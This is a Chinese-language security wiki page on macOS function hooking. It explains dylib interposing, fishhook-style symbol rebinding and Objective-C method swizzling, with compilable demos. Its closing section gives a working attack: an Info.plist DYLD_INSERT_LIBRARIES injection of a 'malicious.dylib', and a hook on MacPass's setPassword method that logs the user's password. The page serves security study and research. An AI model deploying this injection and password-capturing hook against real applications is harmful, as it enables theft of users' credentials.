# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

使用一个包含 **function pointers** 元组的 **dylib**，这些元组分别指向**原始**函数和**替换**函数，并将其放入 **`__interpose` (`__DATA___interpose`)** section（或标记为 **`S_INTERPOSING`** 的 section）中。

然后，通过 **`DYLD_INSERT_LIBRARIES`** **inject** 该 dylib（必须在主应用加载之前执行 interposing）。显然，[对 **`DYLD_INSERT_LIBRARIES`** 使用所施加的**限制**同样适用于此处](macos-library-injection/index.html#check-restrictions)。

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** 环境变量可用于调试 interposing，并会打印 interpose 过程。

另请注意，**interposing 发生在进程与已加载库之间**，它无法与 shared library cache 配合工作。

### Dynamic Interposing

现在还可以使用 **`dyld_dynamic_interpose`** 函数动态 interpose 一个函数。这允许在 **runtime** 中以**编程方式** interpose 一个函数，而不必仅在**开始时**执行。

只需指明要替换的**函数**和**replacement** 函数的**元组**即可。
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

如果你已经在**进程内部**获得了代码执行能力，并且希望在不重新启动目标的情况下 hook 一个**导入的 C 函数**，一种非常常见的原语是 **symbol rebinding**（由 **`fishhook`** 推广）。

该技术不使用 **`__interpose`** section，而是遍历 Mach-O 元数据（`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`），并**覆盖当前 image 使用的导入槽位**。这对于 hook **已经在运行的进程**中的函数非常有用，也可以通过 **`rebind_symbols_image`** 仅 hook **一个 image**。<sup>[2]</sup>

> [!TIP]
> 该技术只影响实际通过**导入指针**进行的调用。如果目标函数在同一 image 内部被**直接调用**，则不存在可重写的导入槽位，因此该技术无法捕获该调用点。
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
在近期的 macOS 版本中，许多 rebinding 目标已不再位于可写的 **`__DATA`** 页面中。Rebinder 通常需要在 patching 指针之前，临时将 **`__DATA_CONST`** 设置为可写。此外，在 Apple Silicon / **`arm64e`** 上，应预期会遇到经过认证的指针，以及 **`__AUTH_CONST.__auth_got`** 中的额外间接层，因此仅扫描经典的 lazy/non-lazy symbol pointer sections 的 rebinder 可能会遗漏一些 call sites。<sup>[3]</sup>

> [!CAUTION]
> **`arm64e`** ABI 对许多 function pointers 使用 **Pointer Authentication (PAC)**。过去在 Intel 上有效的盲目指针写入，可能会破坏 Apple Silicon 上的 call site。编写自己的 rebinder 或 inline hooker 时，应准备使用 **`<ptrauth.h>`** 中的 helper，例如 **`ptrauth_sign_unauthenticated`** 或 **`ptrauth_auth_and_resign`**，并专门在 **`arm64e`** targets 上进行测试。

有关 **`__AUTH`**、**`__AUTH_CONST`** 和 **`__auth_got`** 的更多详情，请查看[此页面](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md)。

## Method Swizzling

在 ObjectiveC 中，方法调用方式如下：**`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

这需要 **object**、**method** 和 **params**。调用方法时，会使用函数 **`objc_msgSend`** 发送一个 **msg**：`int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

该 object 是 **`someObject`**，method 是 **`@selector(method1p1:p2:)`**，参数是 **value1** 和 **value2**。

根据 object structures，可以访问一个 **array of methods**，其中存放着 method code 的 **names** 和 **pointers**。

> [!CAUTION]
> 注意，由于 methods 和 classes 根据其 names 进行访问，这些信息会存储在 binary 中，因此可以使用 `otool -ov </path/bin>` 或 [`class-dump </path/bin>`](https://github.com/nygard/class-dump) 获取这些信息。

### 访问 raw methods

可以访问 methods 的信息，例如 name、params 数量或 address，如以下示例所示：
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

函数 **`method_exchangeImplementations`** 允许**交换**两个函数的**实现地址**。

> [!CAUTION]
> 因此，当调用一个函数时，**实际执行的是另一个函数**。
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> 在这种情况下，如果 **legit** 方法的 **implementation code** **verifies** **method** **name**，它就可能 **detect** 这种 swizzling，并阻止其运行。
>
> 以下 technique 不受此限制。

### 使用 method_setImplementation 进行 Method Swizzling

之前的格式比较奇怪，因为你正在将两个方法的 implementation 互相替换。使用函数 **`method_setImplementation`**，你可以将一个 **method** 的 **implementation** **change** 为另一个方法的 implementation。

请记住，如果你要从新的 implementation 中调用原始 implementation，应当在覆盖它之前 **store** 原始 implementation 的地址，因为之后定位该地址会困难得多。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking 攻击方法论

本页讨论了多种 hook functions 的方式。不过，这些方式都涉及**在待攻击的进程内部运行代码**。

要做到这一点，最简单的技术是通过环境变量注入或劫持 [Dyld](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。不过，我认为也可以通过 [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) 来实现。

然而，这两种选项都**仅限于**未受保护的 binaries/processes。请查看每种技术，以进一步了解其限制。

不过，function hooking attack 非常具体：攻击者会利用它来**从进程内部窃取敏感信息**（否则你只需进行 process injection attack）。而这些敏感信息可能位于用户下载的 Apps 中，例如 MacPass。

因此，攻击者可以选择发现漏洞，或移除应用程序的签名，然后通过应用程序的 Info.plist 注入 **`DYLD_INSERT_LIBRARIES`** 环境变量，添加类似以下内容：
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
然后**重新注册**该应用程序：
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
在该 library 中添加用于 exfiltrate 信息的 hooking code：Passwords、messages……

> [!CAUTION]
> 请注意，在较新版本的 macOS 中，如果你**移除**应用程序二进制文件的签名，且该应用程序之前已经执行过，macOS 将**不再执行该应用程序**。

#### Library 示例
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
